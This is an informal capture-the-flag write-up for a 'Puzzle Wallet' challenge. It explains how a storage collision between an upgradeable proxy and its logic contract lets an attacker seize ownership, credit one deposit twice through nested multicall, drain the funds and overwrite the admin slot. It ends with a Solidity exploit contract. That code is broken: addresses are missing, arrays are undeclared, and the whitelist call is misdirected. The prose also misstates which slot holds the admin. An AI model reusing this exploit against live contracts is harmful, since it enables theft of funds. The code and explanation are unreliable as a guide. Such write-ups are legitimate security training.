#PUZZLE WALET
##Objective: to become the admin of the proxy contract. 

to make ease of upgrading the already existing contract in blockchain , upgradable contracts were introduced.  this deployment pattern contains a proxy contract and an implementation contract. 
user interacts with the logic contract via the proxy contract, and the address of logic contract is updated in the proxy contract. the point to be taken care of is that slot arrangement in both the contract should be the same , why because the slots are mapped. 

##analysis:
setMaxBalance() function checks if the contract's balance is 0.
in order to become the admin we need to write into slot 0.

since the slots are replicated, we can become the owner of the contract if we call proposeNewAdmin() function , since it is external. 

Call proposeNewAdmin(your_address) on PuzzleProxy.
Due to storage collision, owner in PuzzleWallet becomes our address.
call addToWhitelist(your_address) on PuzzleWallet
so that we can get access to functions restricted by onlyWhitelisted modifier.
multiple function calls can be batched using mutlicall function.
by creating a multicall inclusive of deposit, we can credit the balance multiple times with a single ether deposit.
execute(your_address, 0.002 ether, "") 

##exploit:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

interface IPuzzleWallet {
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
}
interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
    function admin() external view returns (address);
}

contract POC {
    IPuzzleWallet wallet = IPuzzleWallet(payable());
    IPuzzleProxy px = IPuzzleProxy(payable());
    function run() external payable {
        require(msg.value == 0.001 ether, "Send 0.001 ether");
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);
        px.proposeNewAdmin(msg.sender);
        wallet.addToWhitelist(msg.sender);
        wallet.multicall{value: 0.001 ether}(nestedMulticall);
        wallet.execute(msg.sender, 0.002 ether, "");
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
    function checkAdmin() external view returns (address) {
        return px.admin();
    }
}
```






